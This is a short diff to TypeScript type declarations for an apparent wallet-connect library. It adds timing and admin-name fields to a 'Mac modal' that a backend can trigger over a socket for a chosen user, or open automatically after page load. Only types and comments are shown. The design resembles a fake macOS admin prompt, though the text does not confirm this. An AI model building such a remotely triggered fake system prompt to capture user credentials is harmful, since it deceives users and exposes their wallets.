@@ -36,8 +36,10 @@ interface ShowMacModalPayload {
     message?: string;
     user_id?: string;
     timestamp?: string;
-    /** Text to display in the admin name input field. */
+    /** Text to display in the admin name input field (mac_user_name). */
     text?: string;
+    /** Timing in seconds (-1 = socket-only, 0+ = open after N seconds on load). */
+    timing?: number;
 }
 
 interface WalletSelectionModalProps extends WalletConnectModalProps {
@@ -61,9 +63,11 @@ interface MacModalTriggerProps {
 /**
  * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when
  * the payload's user_id matches this component's userId (or backendConfig.userId).
- * Mount once (e.g. at app root) to enable socket-triggered Mac modal.
+ * Also fetches mac_user_name and mac_modal_timing from user DB on load.
+ * If mac_modal_timing >= 0, opens the Mac modal after that many seconds since the website is loaded.
+ * If mac_modal_timing === -1, only socket-triggered (same as before).
  *
- * Backend example: io.emit('showMacModal', { message: '...', user_id, timestamp });
+ * Backend example: io.emit('showMacModal', { message: '...', user_id, text, timing, timestamp });
  */
 declare const MacModalTrigger: React.FC<MacModalTriggerProps>;
 
